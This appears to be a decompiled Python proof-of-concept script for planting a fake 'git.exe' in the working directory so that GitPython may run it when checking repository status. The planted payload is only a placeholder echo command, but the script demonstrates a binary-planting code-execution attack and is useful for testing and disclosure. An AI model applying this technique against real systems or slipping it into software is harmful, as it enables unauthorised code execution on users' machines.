# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 335_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 628 bytes
import os, git
malicious_git_path = os.path.join(os.getcwd(), "git.exe")
with open(malicious_git_path, "w") as f:
    f.write("# Malicious code here\n")
    f.write("import os\n")
    f.write("os.system('echo Malicious code executed!')\n")
try:
    repo = git.Repo(".")
    print(repo.git.status())
except Exception as e:
    try:
        print(f"Error: {e}")
    finally:
        e = None
        del e

# okay decompiling 335_1.pyc
